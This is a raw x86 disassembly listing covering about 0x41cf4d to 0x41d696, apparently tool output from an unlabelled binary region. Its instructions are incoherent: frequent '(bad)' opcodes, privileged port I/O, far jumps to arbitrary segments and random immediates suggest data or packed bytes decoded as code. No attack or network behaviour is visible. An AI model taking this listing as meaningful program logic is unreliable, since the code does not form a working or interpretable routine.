  41cf4d:	outs   dx,DWORD PTR ds:[esi]
  41cf4e:	fwait
  41cf4f:	cmc    
  41cf50:	rol    BYTE PTR [edi-0x19],1
  41cf53:	push   bp
  41cf55:	rcl    DWORD PTR [eax+ebx*1],1
  41cf58:	cwde   
  41cf59:	add    eax,0x26a2f369
  41cf5e:	mov    ebx,0xc5f84c40
  41cf63:	ins    BYTE PTR es:[edi],dx
  41cf64:	mov    bl,0x15
  41cf66:	sub    BYTE PTR [edx],dl
  41cf68:	call   0x5f49fa16
  41cf6d:	xchg   ebx,eax
  41cf6e:	add    esi,DWORD PTR [ebp+eax*1-0x3e038ef5]
  41cf75:	loopne 0x41cf6a
  41cf77:	loope  0x41cfaf
  41cf79:	add    al,0xba
  41cf7b:	add    eax,0x9ef4b63
  41cf80:	push   0xa4198d29
  41cf85:	add    eax,0xd07cb37
  41cf8a:	sar    BYTE PTR [ebx+0x58c606e4],1
  41cf90:	or     BYTE PTR [ebp+0x43de20f2],ah
  41cf96:	jl     0x41cf8a
  41cf98:	repz ret 
  41cf9a:	push   0xf6cf20ca
  41cf9f:	les    esp,FWORD PTR [edi-0x5296a0c7]
  41cfa5:	jnp    0x41cf2c
  41cfa7:	leave  
  41cfa8:	in     al,0x68
  41cfaa:	aas    
  41cfab:	adc    DWORD PTR [edi+0x42],esp
  41cfae:	push   ecx
  41cfaf:	inc    esi
  41cfb0:	loope  0x41d00e
  41cfb2:	ret    
  41cfb3:	sub    al,0x65
  41cfb5:	(bad)  [edi]
  41cfb7:	or     DWORD PTR [esi],ecx
  41cfb9:	into   
  41cfba:	jae    0x41cf7f
  41cfbc:	ror    BYTE PTR [eax],1
  41cfbe:	in     al,dx
  41cfbf:	cmp    eax,0xeadacbcd
  41cfc4:	mov    ebx,0xa7368ef6
  41cfc9:	arpl   sp,sp
  41cfcb:	sub    al,0xca
  41cfcd:	in     eax,dx
  41cfce:	pop    ds
  41cfcf:	fcmovu st,st(4)
  41cfd1:	arpl   WORD PTR [edi-0x26d88a90],di
  41cfd7:	imul   BYTE PTR [ebx-0x3d]
  41cfda:	mov    dl,0x7
  41cfdc:	outs   dx,DWORD PTR ds:[esi]
  41cfdd:	jne    0x41d018
  41cfdf:	dec    eax
  41cfe0:	adc    al,0x76
  41cfe2:	cmp    al,0xee
  41cfe4:	inc    edi
  41cfe5:	jo     0x41cff5
  41cfe7:	aaa    
  41cfe8:	outs   dx,DWORD PTR ds:[esi]
  41cfe9:	pop    edx
  41cfea:	(bad)  
  41cfeb:	pop    edi
  41cfec:	inc    esi
  41cfed:	les    edi,FWORD PTR [ecx]
  41cfef:	sub    dl,bh
  41cff1:	jecxz  0x41cfe7
  41cff3:	inc    ebx
  41cff4:	jge    0x41d05b
  41cff6:	mov    ds:0xe7506b68,eax
  41cffb:	mov    dh,0xb5
  41cffd:	xor    DWORD PTR [edx-0x7c],eax
  41d000:	xchg   cl,bh
  41d002:	mov    ebx,ebx
  41d004:	test   al,0x39
  41d006:	pop    ecx
  41d007:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d008:	push   0x58797ff6
  41d00d:	outs   dx,DWORD PTR ds:[esi]
  41d00e:	and    al,0x5d
  41d010:	xor    al,0xe
  41d012:	aas    
  41d013:	pop    esi
  41d014:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d015:	sbb    ebx,DWORD PTR [edx]
  41d017:	jbe    0x41cfca
  41d019:	sti    
  41d01a:	lods   eax,DWORD PTR ds:[esi]
  41d01b:	fldenv [ebx+0xd]
  41d01e:	inc    edx
  41d01f:	in     al,dx
  41d020:	pop    eax
  41d021:	leave  
  41d022:	push   bp
  41d024:	dec    ecx
  41d025:	inc    esi
  41d026:	clc    
  41d027:	(bad)  
  41d028:	int3   
  41d029:	and    eax,0xb7e122e3
  41d02e:	adc    eax,0x3e2a1e1
  41d033:	xlat   BYTE PTR ds:[ebx]
  41d034:	jnp    0x41d086
  41d036:	int    0x1d
  41d038:	cli    
  41d039:	lahf   
  41d03a:	lds    edx,FWORD PTR [ecx]
  41d03c:	sub    eax,0x53def329
  41d041:	sar    BYTE PTR [edx],1
  41d043:	pop    esi
  41d044:	iret   
  41d045:	push   0x39
  41d047:	sbb    eax,0xe59a0a2e
  41d04c:	cmp    bh,ch
  41d04e:	jmp    0x41d082
  41d050:	pushf  
  41d051:	sbb    DWORD PTR [edi],ebp
  41d053:	lds    edx,FWORD PTR [edi+0x2]
  41d056:	(bad)  
  41d057:	sub    BYTE PTR [edi+eiz*4],dl
  41d05a:	int    0xcf
  41d05c:	mov    esi,0xba872c9b
  41d061:	mov    bl,0xee
  41d063:	inc    BYTE PTR [ebp+0x45292a77]
  41d069:	push   ds
  41d06a:	inc    esp
  41d06b:	shl    DWORD PTR [eax],0x21
  41d06e:	sti    
  41d06f:	mov    DWORD PTR [edx-0x62],ebx
  41d072:	sar    DWORD PTR [esi],cl
  41d074:	dec    eax
  41d075:	loopne 0x41d080
  41d077:	test   dh,ah
  41d079:	es mov dh,0xe7
  41d07c:	ss iret 
  41d07e:	and    DWORD PTR [esi],edi
  41d080:	jb     0x41d06d
  41d082:	sbb    ebx,DWORD PTR [ebx-0x5bde9f00]
  41d088:	pop    eax
  41d089:	hlt    
  41d08a:	jl     0x41d0f1
  41d08c:	mov    al,0xb0
  41d08e:	cmp    BYTE PTR [ebp+esi*1+0x9875c4d],al
  41d095:	(bad)  
  41d096:	mov    WORD PTR [ebx],gs
  41d098:	ins    DWORD PTR es:[edi],dx
  41d099:	mov    esp,ebx
  41d09b:	inc    esi
  41d09c:	mov    bl,0xb6
  41d09e:	loope  0x41d109
  41d0a0:	sbb    eax,0xbb99b8f5
  41d0a5:	jmp    0xf0c9:0xe65adaf0
  41d0ac:	sub    eax,edx
  41d0ae:	arpl   WORD PTR [eax-0x1d],si
  41d0b1:	jg     0x41d0a4
  41d0b3:	mov    dh,0xc0
  41d0b5:	test   DWORD PTR [edx-0xe545602],0x5c49ad20
  41d0bf:	adc    DWORD PTR [esi-0x50],0xffffffca
  41d0c3:	mov    ecx,0x33c9e8f3
  41d0c8:	aad    0x45
  41d0ca:	ret    
  41d0cb:	push   ecx
  41d0cc:	sub    DWORD PTR [edi],edx
  41d0ce:	shl    esp,1
  41d0d0:	cmp    DWORD PTR [edi-0x519b58e8],esp
  41d0d6:	xchg   edx,eax
  41d0d7:	inc    ebx
  41d0d8:	sti    
  41d0d9:	fsub   QWORD PTR [ebx-0x55]
  41d0dc:	or     DWORD PTR [edi+0x4f],ecx
  41d0df:	test   eax,0xac23318f
  41d0e4:	cmp    BYTE PTR [ecx-0x1c],cl
  41d0e7:	jp     0x41d09f
  41d0e9:	push   ss
  41d0ea:	or     esp,edi
  41d0ec:	in     eax,dx
  41d0ed:	or     al,0x42
  41d0ef:	(bad)  
  41d0f0:	push   ds
  41d0f1:	mov    ah,0x42
  41d0f3:	jno    0x41d105
  41d0f5:	add    al,0x10
  41d0f7:	sub    bl,ch
  41d0f9:	mov    WORD PTR [edx+0x1d4f0f60],gs
  41d0ff:	stos   BYTE PTR es:[edi],al
  41d100:	test   al,0x67
  41d102:	outs   dx,DWORD PTR ds:[esi]
  41d103:	jmp    DWORD PTR [eax+0x4c4741cd]
  41d109:	dec    esi
  41d10a:	dec    esi
  41d10b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d10c:	jb     0x41d100
  41d10e:	add    dl,BYTE PTR [eax-0xaba5dda]
  41d114:	mov    bl,0x41
  41d116:	inc    esp
  41d117:	pop    ss
  41d118:	inc    esi
  41d119:	push   esi
  41d11a:	mov    es,WORD PTR [edx+0x61]
  41d11d:	jo     0x41d11e
  41d11f:	loopne 0x41d0cb
  41d121:	hlt    
  41d122:	fs arpl cx,sp
  41d125:	les    eax,FWORD PTR [edi]
  41d127:	dec    ebx
  41d128:	dec    ecx
  41d129:	lahf   
  41d12a:	pusha  
  41d12b:	mov    al,ds:0xeaab7532
  41d130:	lods   al,BYTE PTR ds:[esi]
  41d131:	sbb    bl,bh
  41d133:	aad    0xfb
  41d135:	les    eax,FWORD PTR [edi-0x19]
  41d138:	cmc    
  41d139:	repnz push ds
  41d13b:	pop    esi
  41d13c:	xlat   BYTE PTR ds:[ebx]
  41d13d:	(bad)  
  41d13e:	or     al,0x60
  41d140:	or     BYTE PTR [edx],cl
  41d142:	and    ebp,esp
  41d144:	xchg   esp,eax
  41d145:	and    BYTE PTR [eax-0x53],dl
  41d148:	mov    ds:0xe11a8775,al
  41d14d:	pushf  
  41d14e:	add    ecx,DWORD PTR [ecx+0x7afa07bb]
  41d154:	inc    edx
  41d155:	jb     0x41d120
  41d157:	jg     0x41d18c
  41d159:	xchg   esi,eax
  41d15a:	ret    0x3959
  41d15d:	sbb    al,dl
  41d15f:	sub    DWORD PTR [edi+0x455ee37b],0x30
  41d166:	xchg   ebx,eax
  41d167:	mov    eax,DWORD PTR [edx+edi*2-0x16fea741]
  41d16e:	fadd   QWORD PTR [eax]
  41d170:	mov    edi,esi
  41d172:	ss pop ebp
  41d174:	and    al,0x7b
  41d176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d177:	adc    BYTE PTR [edi],dl
  41d179:	push   0xffffffb9
  41d17b:	out    dx,eax
  41d17c:	jmp    0x130d54
  41d181:	cdq    
  41d182:	mov    ebp,0x27702990
  41d187:	int3   
  41d188:	call   0xa95cb62d
  41d18d:	jns    0x41d120
  41d18f:	imul   ebx,DWORD PTR [eax+0xa],0x31106539
  41d196:	jns    0x41d120
  41d198:	outs   dx,DWORD PTR ds:[esi]
  41d199:	or     esp,DWORD PTR [eax-0x60]
  41d19c:	(bad)  
  41d19d:	cwde   
  41d19e:	sbb    eax,0xa0255132
  41d1a3:	dec    esp
  41d1a4:	inc    esp
  41d1a5:	ja     0x41d222
  41d1a7:	push   esi
  41d1a8:	mov    esi,0xae559d8b
  41d1ad:	sbb    al,0x1a
  41d1af:	and    dh,BYTE PTR [edi+0x6b]
  41d1b2:	mov    esp,DWORD PTR [ecx]
  41d1b4:	pushf  
  41d1b5:	xor    cl,al
  41d1b7:	jg     0x41d210
  41d1b9:	arpl   bp,bx
  41d1bb:	pop    ds
  41d1bc:	test   al,0xb3
  41d1be:	xchg   ebp,eax
  41d1bf:	mov    esp,0x33df0ed2
  41d1c4:	stc    
  41d1c5:	pop    ds
  41d1c6:	mov    dl,0x61
  41d1c8:	das    
  41d1c9:	je     0x41d1ec
  41d1cb:	clc    
  41d1cc:	or     BYTE PTR [ebp-0x5d],ch
  41d1cf:	repz add DWORD PTR [eax+0x19314e60],edi
  41d1d6:	mov    WORD PTR [ecx+eax*1-0x5d31f40e],fs
  41d1dd:	mov    ebx,0x831570a6
  41d1e2:	dec    eax
  41d1e3:	adc    eax,0x29c2243
  41d1e8:	adc    eax,DWORD PTR [di]
  41d1eb:	mov    edi,0xd0852a27
  41d1f0:	cdq    
  41d1f1:	lods   eax,DWORD PTR ds:[esi]
  41d1f2:	jae    0x41d198
  41d1f4:	sahf   
  41d1f5:	outs   dx,BYTE PTR ds:[esi]
  41d1f6:	sub    bh,cl
  41d1f8:	loopne 0x41d25d
  41d1fa:	cmp    esi,DWORD PTR [ebp+0x16f1744]
  41d200:	push   esp
  41d201:	and    al,0xd2
  41d203:	push   ebx
  41d204:	das    
  41d205:	mov    eax,0x103e04d6
  41d20a:	leave  
  41d20b:	or     ecx,DWORD PTR [ecx-0x6c792f38]
  41d211:	cmp    eax,DWORD PTR [ebx+0x5b]
  41d214:	sub    DWORD PTR [edi+0x6b],0x14
  41d218:	cwde   
  41d219:	into   
  41d21a:	adc    esp,esp
  41d21c:	(bad)  
  41d21d:	ja     0x41d29e
  41d21f:	sub    DWORD PTR [ecx],edx
  41d221:	mov    cl,0x3d
  41d223:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d224:	inc    esi
  41d225:	rep outs dx,DWORD PTR ds:[esi]
  41d227:	pop    eax
  41d228:	dec    ebp
  41d229:	add    bh,BYTE PTR [eax+0x76]
  41d22c:	rcl    DWORD PTR [edx+0x5b0089d2],1
  41d232:	(bad)  
  41d233:	jmp    0x96e8:0xe29730e7
  41d23a:	add    BYTE PTR [ebx+0x6d586149],ch
  41d240:	dec    eax
  41d241:	inc    edi
  41d242:	xchg   edi,eax
  41d243:	xchg   ebp,eax
  41d244:	nop
  41d245:	jl     0x41d2a9
  41d247:	and    al,al
  41d249:	inc    ebp
  41d24a:	lds    ecx,FWORD PTR [edi+0x17a43cd]
  41d250:	mov    cl,0x7f
  41d252:	mov    eax,ds:0xb5846b20
  41d257:	pop    ebp
  41d258:	pop    edx
  41d259:	dec    edx
  41d25a:	xor    ebp,DWORD PTR [ecx]
  41d25c:	xchg   edi,eax
  41d25d:	(bad)  
  41d25e:	out    dx,eax
  41d25f:	popf   
  41d260:	push   edi
  41d261:	add    BYTE PTR [ebx+0x76],ah
  41d264:	and    BYTE PTR [eax-0x28e1ca65],dl
  41d26a:	sub    eax,0xc47e463a
  41d26f:	push   ebx
  41d270:	repz push ds
  41d272:	sbb    eax,0x9f978c1e
  41d277:	dec    ebp
  41d278:	xchg   ebx,eax
  41d279:	in     al,0xc5
  41d27b:	pop    esi
  41d27c:	dec    eax
  41d27d:	fmul   DWORD PTR [ebx]
  41d27f:	sbb    BYTE PTR [edi+0x1e],0x99
  41d283:	push   es
  41d284:	lahf   
  41d285:	adc    DWORD PTR [esi-0x7b],ebx
  41d288:	mov    ecx,0xdc5416fc
  41d28d:	mov    cl,BYTE PTR [esi+eax*2+0x4b]
  41d291:	xchg   dl,dl
  41d293:	sub    ecx,DWORD PTR [edx+0x3391bb0]
  41d299:	dec    ecx
  41d29a:	adc    DWORD PTR [ecx-0x50],ebx
  41d29d:	jo     0x41d235
  41d29f:	cmp    DWORD PTR [esi+esi*2+0x14],esi
  41d2a3:	pop    ds
  41d2a4:	daa    
  41d2a5:	xchg   DWORD PTR [edi-0x2d],esp
  41d2a8:	(bad)  
  41d2a9:	cli    
  41d2aa:	aaa    
  41d2ab:	dec    esi
  41d2ac:	pop    ecx
  41d2ad:	sti    
  41d2ae:	sar    DWORD PTR [ebx-0x46de164f],0x90
  41d2b5:	fwait
  41d2b6:	inc    esi
  41d2b7:	call   0x9f6eeec5
  41d2bc:	xchg   esi,eax
  41d2bd:	mov    edi,0x34721be8
  41d2c2:	arpl   WORD PTR [ecx-0x2adf8430],bp
  41d2c8:	call   0x7f97d113
  41d2cd:	inc    esi
  41d2ce:	div    BYTE PTR [eax-0x350dd81f]
  41d2d4:	outs   dx,BYTE PTR ds:[esi]
  41d2d5:	push   ebp
  41d2d6:	fmulp  st(0),st
  41d2d8:	mov    bh,0x97
  41d2da:	js     0x41d32e
  41d2dc:	cld    
  41d2dd:	outs   dx,DWORD PTR ds:[esi]
  41d2de:	call   0x2f230358
  41d2e3:	pop    esi
  41d2e4:	and    eax,0x92740462
  41d2e9:	call   0x3b6e:0x958aa4d2
  41d2f0:	xchg   esi,eax
  41d2f1:	inc    ebx
  41d2f2:	xor    edi,ebp
  41d2f4:	call   0xcded96f2
  41d2f9:	clc    
  41d2fa:	loopne 0x41d2bf
  41d2fc:	rcr    DWORD PTR [edx],cl
  41d2fe:	jmp    0xfd08:0xcb25497f
  41d305:	inc    esp
  41d306:	add    DWORD PTR [ecx+0x7c],ecx
  41d309:	push   ds
  41d30a:	cmp    al,0x8a
  41d30c:	div    DWORD PTR fs:0x3a6fb73a
  41d313:	outs   dx,BYTE PTR ds:[esi]
  41d314:	sub    BYTE PTR [eax],bl
  41d316:	rcl    BYTE PTR [edx],1
  41d318:	mov    dh,0x6f
  41d31a:	les    ebp,FWORD PTR [ebx+0x76b427e4]
  41d320:	lods   eax,DWORD PTR ds:[esi]
  41d321:	mov    ecx,0x804364b7
  41d326:	sub    BYTE PTR [ebp+0x48d5c961],0x96
  41d32d:	xlat   BYTE PTR ds:[ebx]
  41d32e:	test   BYTE PTR [ecx+0x74f23611],dh
  41d334:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d335:	lods   eax,DWORD PTR ds:[esi]
  41d336:	xchg   ah,bl
  41d338:	int3   
  41d339:	xchg   BYTE PTR [edi-0x2b],bh
  41d33c:	xor    al,0xf
  41d33e:	sbb    ecx,edx
  41d340:	aaa    
  41d341:	les    esi,FWORD PTR [esi+0x7665e827]
  41d347:	(bad)  
  41d348:	(bad)  
  41d349:	mov    ebx,0xce2e3611
  41d34e:	test   eax,0x3b28a1d2
  41d353:	ja     0x41d309
  41d355:	test   bl,al
  41d357:	loope  0x41d336
  41d359:	mov    edi,DWORD PTR [ecx+0x9312473]
  41d35f:	inc    edi
  41d360:	retf   0xc2cb
  41d363:	push   es
  41d364:	dec    ebp
  41d365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d366:	jns    0x41d347
  41d368:	adc    ah,ch
  41d36a:	sub    DWORD PTR ds:0x6b98e8f7,esp
  41d370:	mov    ds:0xbf65b5bc,al
  41d375:	(bad)
  41d378:	out    dx,al
  41d379:	adc    BYTE PTR [edi-0x1d6402e1],0x1
  41d380:	jno    0x41d3b2
  41d382:	(bad)  
  41d383:	push   ecx
  41d384:	iret   
  41d385:	xchg   ebx,eax
  41d386:	mov    bh,0x95
  41d388:	repz adc DWORD PTR [edx+0x3dc0ce18],edi
  41d38f:	and    dl,bl
  41d391:	gs inc eax
  41d393:	push   ebp
  41d394:	mov    esi,esp
  41d396:	ja     0x41d37e
  41d398:	or     DWORD PTR [ebx-0x7b48120a],ebx
  41d39e:	(bad)  
  41d39f:	in     al,0x27
  41d3a1:	mov    dl,0x57
  41d3a3:	xchg   ebx,eax
  41d3a4:	gs inc ecx
  41d3a6:	out    dx,al
  41d3a7:	stos   BYTE PTR es:[edi],al
  41d3a8:	cmp    bl,ch
  41d3aa:	das    
  41d3ab:	cmp    edx,DWORD PTR [ecx]
  41d3ad:	aam    0xd4
  41d3af:	addr16 mov eax,ebp
  41d3b2:	stos   DWORD PTR es:[edi],eax
  41d3b3:	mov    ch,0x32
  41d3b5:	inc    ecx
  41d3b6:	xor    eax,0x25a11873
  41d3bb:	dec    edi
  41d3bc:	mov    bl,0xbd
  41d3be:	dec    edi
  41d3bf:	cmp    eax,0x3eeedef5
  41d3c4:	(bad)  
  41d3c5:	jle    0x41d43e
  41d3c7:	mov    ebp,0x46dfc693
  41d3cc:	mov    al,0x8
  41d3ce:	dec    ebx
  41d3cf:	cmc    
  41d3d0:	stos   BYTE PTR es:[edi],al
  41d3d1:	(bad)  
  41d3d2:	pusha  
  41d3d3:	mov    eax,0xed0f44c7
  41d3d8:	imul   dh
  41d3da:	push   eax
  41d3db:	pop    es
  41d3dc:	xchg   esp,eax
  41d3dd:	test   BYTE PTR [edx+0x67d8b9eb],ah
  41d3e3:	jmp    0x917d:0x6bbec5aa
  41d3ea:	pop    esp
  41d3eb:	test   BYTE PTR [edx-0x74],dl
  41d3ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3ef:	jae    0x41d3bf
  41d3f1:	popf   
  41d3f2:	jne    0x41d427
  41d3f4:	mov    dh,BYTE PTR [eiz*1+0x633eab22]
  41d3fb:	add    DWORD PTR [edi+0x5a6b24bf],0xffffff8a
  41d402:	mov    WORD PTR [ecx],fs
  41d404:	xchg   esp,eax
  41d405:	mov    ebx,DWORD PTR [edx]
  41d407:	inc    ebx
  41d408:	pusha  
  41d409:	or     al,0xcf
  41d40b:	paddq  mm7,mm6
  41d40e:	hlt    
  41d40f:	xchg   ecx,eax
  41d410:	pmaxub mm3,QWORD PTR ds:0x2336353b
  41d417:	sub    BYTE PTR [esi],bh
  41d419:	in     eax,dx
  41d41a:	fcom   st(4)
  41d41c:	inc    edi
  41d41d:	ins    BYTE PTR es:[edi],dx
  41d41e:	and    ebx,DWORD PTR [ebp+0x78]
  41d421:	push   ss
  41d422:	add    edi,ebp
  41d424:	push   ebx
  41d425:	out    dx,al
  41d426:	inc    ebp
  41d427:	or     al,0xf7
  41d429:	xchg   edx,eax
  41d42a:	mov    esi,0xa5779363
  41d42f:	mov    ecx,0xa2cd1699
  41d434:	mov    esp,0x35db45b5
  41d439:	fsubp  st(1),st
  41d43b:	repz add ah,BYTE PTR [ebp+0xface9d5]
  41d442:	pop    ebp
  41d443:	das    
  41d444:	call   0xf05e:0xd5a2f8af
  41d44b:	adc    edi,esi
  41d44d:	test   BYTE PTR [ecx+0x52],bh
  41d450:	ja     0x41d3d4
  41d452:	gs je  0x41d441
  41d455:	into   
  41d456:	mov    eax,0x5dbdbd48
  41d45b:	xor    DWORD PTR [eax+0x7d],edx
  41d45e:	jge    0x41d438
  41d460:	mov    esp,0xe1cc1ec7
  41d465:	shl    esi,cl
  41d467:	mov    ecx,0xb6e01c79
  41d46c:	stos   BYTE PTR es:[edi],al
  41d46d:	fidivr WORD PTR [ecx]
  41d46f:	scas   eax,DWORD PTR es:[edi]
  41d470:	xchg   esp,eax
  41d471:	inc    esi
  41d472:	mov    ebp,0x18ea12a3
  41d477:	retf   0x38e7
  41d47a:	inc    ebp
  41d47b:	jbe    0x41d4a0
  41d47d:	sub    eax,0x9b5f1b68
  41d482:	jge    0x41d4e7
  41d484:	mov    eax,ds:0x7776489e
  41d489:	dec    eax
  41d48a:	push   0x56
  41d48c:	add    al,0xc5
  41d48e:	shl    DWORD PTR [esp+ebx*8],1
  41d491:	dec    ebx
  41d492:	xchg   edx,eax
  41d493:	test   al,0x2f
  41d495:	in     al,0x9d
  41d497:	scas   al,BYTE PTR es:[edi]
  41d498:	push   ds
  41d499:	jns    0x41d436
  41d49b:	outs   dx,DWORD PTR ds:[esi]
  41d49c:	div    BYTE PTR [ecx-0x7417cf5d]
  41d4a2:	imul   ecx,DWORD PTR [edi+edx*1+0x56e6b543],0x8d111354
  41d4ad:	pop    ebx
  41d4ae:	into   
  41d4af:	add    BYTE PTR [edx-0x2c],bh
  41d4b2:	int3   
  41d4b3:	out    0x94,al
  41d4b5:	call   0x2989:0x2f182a17
  41d4bc:	xor    DWORD PTR [ebp+ecx*8+0x7b32afa6],edi
  41d4c3:	mov    BYTE PTR ds:0x569a4868,dl
  41d4c9:	test   DWORD PTR ds:[edx+eiz*4+0x7876dbe5],ecx
  41d4d1:	pop    edi
  41d4d2:	cli    
  41d4d3:	mov    esp,0xd2790497
  41d4d8:	jmp    0x41d4e4
  41d4da:	add    BYTE PTR [ecx+0x30],0x44
  41d4de:	inc    ecx
  41d4df:	jns    0x41d4e3
  41d4e1:	lods   eax,DWORD PTR ds:[esi]
  41d4e2:	outs   dx,BYTE PTR ds:[esi]
  41d4e3:	inc    edi
  41d4e4:	pop    edx
  41d4e5:	pop    esp
  41d4e6:	out    0x62,eax
  41d4e8:	lahf   
  41d4e9:	sbb    BYTE PTR [ecx-0x71],al
  41d4ec:	scas   eax,DWORD PTR es:[edi]
  41d4ed:	cmp    ah,BYTE PTR [ebp-0x236a0068]
  41d4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4f4:	test   ah,0xf8
  41d4f7:	sbb    BYTE PTR [ebx+0x18],ch
  41d4fa:	xlat   BYTE PTR ds:[ebx]
  41d4fb:	dec    ecx
  41d4fc:	and    al,0x7f
  41d4fe:	sub    DWORD PTR [esi+0x2c],ebx
  41d501:	icebp  
  41d502:	jbe    0x41d54f
  41d504:	in     al,0x0
  41d506:	mov    ecx,0x56e13853
  41d50b:	gs (bad) 
  41d50d:	out    dx,al
  41d50e:	adc    dh,al
  41d510:	push   es
  41d511:	mov    esi,0x29fcbda8
  41d516:	test   eax,0xea870b5b
  41d51b:	sbb    dl,BYTE PTR [edi]
  41d51d:	out    0xc1,al
  41d51f:	push   ebx
  41d520:	jnp    0x41d503
  41d522:	outs   dx,BYTE PTR ds:[esi]
  41d523:	jb     0x41d596
  41d525:	scas   eax,DWORD PTR es:[edi]
  41d526:	push   0xae579530
  41d52b:	rcr    DWORD PTR [esi-0x59],0xba
  41d52f:	cli    
  41d530:	imul   eax,DWORD PTR [edi],0x72
  41d533:	imul   BYTE PTR [ebx]
  41d535:	sbb    eax,0xd19c4457
  41d53a:	cmp    DWORD PTR ds:0x9d87e36d,ebp
  41d540:	pop    es
  41d541:	inc    edx
  41d542:	xchg   ebx,eax
  41d543:	cmp    edi,edi
  41d545:	sbb    eax,0x20
  41d548:	fwait
  41d549:	icebp  
  41d54a:	mov    edi,0x5dab6334
  41d54f:	in     al,dx
  41d550:	pop    ebx
  41d551:	add    BYTE PTR [ebp+0x7e],cl
  41d554:	pop    ebp
  41d555:	ins    BYTE PTR es:[edi],dx
  41d556:	jbe    0x41d58f
  41d558:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d559:	test   al,0x15
  41d55b:	lahf   
  41d55c:	imul   edx,ebx,0xcd3039bd
  41d562:	xor    eax,0xbf19de11
  41d567:	pop    ecx
  41d568:	jnp    0x41d5be
  41d56a:	dec    edi
  41d56b:	icebp  
  41d56c:	push   ss
  41d56d:	in     al,0xba
  41d56f:	dec    esp
  41d571:	add    ebx,eax
  41d573:	jle    0x41d5bd
  41d575:	jmp    0xf635:0x79076967
  41d57c:	nop
  41d57d:	dec    eax
  41d57e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d57f:	hlt    
  41d580:	inc    esp
  41d581:	xor    eax,0x5bb71896
  41d586:	mov    dl,0x25
  41d588:	(bad)  
  41d589:	mov    ds:0x76f2086f,al
  41d58e:	mov    al,0x80
  41d590:	jb     0x41d521
  41d592:	fist   DWORD PTR [edx]
  41d594:	mov    edi,0x79f50ce8
  41d599:	mov    esi,0x61a9765d
  41d59e:	stc    
  41d59f:	rcl    BYTE PTR [esp],0xb9
  41d5a3:	jl     0x41d542
  41d5a5:	sar    DWORD PTR [ebx-0x1e482e45],cl
  41d5ab:	cdq    
  41d5ac:	test   bl,ch
  41d5ae:	sbb    eax,edi
  41d5b0:	ja     0x41d575
  41d5b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5b3:	out    0xd0,al
  41d5b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5b6:	mov    WORD PTR [eax-0x70d950ec],?
  41d5bc:	mov    al,ds:0x97545d81
  41d5c1:	iret   
  41d5c2:	shl    ebx,cl
  41d5c4:	inc    edx
  41d5c5:	or     eax,0x78c38d92
  41d5ca:	ja     0x41d599
  41d5cc:	mov    ds:0xae21f18b,eax
  41d5d1:	loop   0x41d583
  41d5d3:	jmp    0x680e:0x2c410518
  41d5da:	popa   
  41d5db:	ret    
  41d5dc:	jmp    0x4176685a
  41d5e1:	nop
  41d5e2:	or     DWORD PTR [edi-0x750a7641],edx
  41d5e8:	xor    DWORD PTR [ebx],ebx
  41d5ea:	xchg   ebp,eax
  41d5eb:	pop    edx
  41d5ec:	scas   al,BYTE PTR es:[edi]
  41d5ed:	lahf   
  41d5ee:	or     DWORD PTR [ebp+0x5b],esi
  41d5f1:	mov    BYTE PTR [ebx],bh
  41d5f3:	inc    esi
  41d5f4:	mov    ecx,0x995c4f40
  41d5f9:	lods   eax,DWORD PTR ds:[esi]
  41d5fa:	and    BYTE PTR [esi+0x44],al
  41d5fd:	daa    
  41d5fe:	fnstsw WORD PTR [ebx]
  41d600:	mov    dh,0xc6
  41d602:	stos   DWORD PTR es:[edi],eax
  41d603:	and    eax,0x2faa0394
  41d608:	inc    esi
  41d609:	adc    DWORD PTR [edi-0x3d694b71],esp
  41d60f:	fnsave [ecx]
  41d611:	jne    0x41d600
  41d613:	mov    cl,0xc2
  41d615:	add    edx,ebp
  41d617:	mov    ch,0x5b
  41d619:	mov    edi,0xb81e16a
  41d61e:	inc    ecx
  41d61f:	jbe    0x41d5c1
  41d621:	sub    BYTE PTR [ebx],al
  41d623:	dec    edx
  41d624:	pop    ss
  41d625:	test   eax,0xfb362742
  41d62a:	test   ebx,edi
  41d62c:	(bad)  
  41d62d:	xchg   DWORD PTR [ebx+0x5e],ebp
  41d630:	pop    ebx
  41d631:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d632:	adc    al,0xd2
  41d634:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d635:	lahf   
  41d636:	sbb    eax,0xdd538375
  41d63b:	jmp    0x41d66f
  41d63d:	(bad)  
  41d63f:	xor    al,0xd
  41d641:	cmp    al,0xd5
  41d643:	or     al,BYTE PTR [ecx]
  41d645:	in     eax,0xe2
  41d647:	gs enter 0x7ed9,0x66
  41d64c:	fwait
  41d64d:	mov    edi,0x4cf5c213
  41d652:	nop    DWORD PTR [eax+0x74]
  41d656:	dec    ebp
  41d657:	lahf   
  41d658:	test   al,0xac
  41d65a:	repz sub BYTE PTR [edi],cl
  41d65d:	and    esi,edx
  41d65f:	fst    DWORD PTR [ebp+0x6a8f5f9a]
  41d665:	in     eax,dx
  41d666:	in     al,dx
  41d667:	cmp    al,0xdd
  41d669:	push   0x3bec58cd
  41d66e:	push   cs
  41d66f:	xor    eax,0xb679d5c5
  41d674:	add    ebp,esp
  41d676:	je     0x41d6a8
  41d678:	and    ebx,DWORD PTR [edi-0x50]
  41d67b:	sbb    al,0x8e
  41d67d:	jno    0x41d6ba
  41d67f:	mov    cl,0x97
  41d681:	xor    BYTE PTR ds:0xf04e,ch
  41d686:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d687:	push   ds
  41d688:	sbb    BYTE PTR ds:0x95d7a920,bl
  41d68e:	icebp  
  41d68f:	xchg   esi,eax
  41d690:	lahf   
  41d691:	sbb    dh,BYTE PTR [ebx+eax*2-0xa]
  41d695:	push   ecx
  41d696:	mov    WORD PTR [esi+0x57dc24a],es
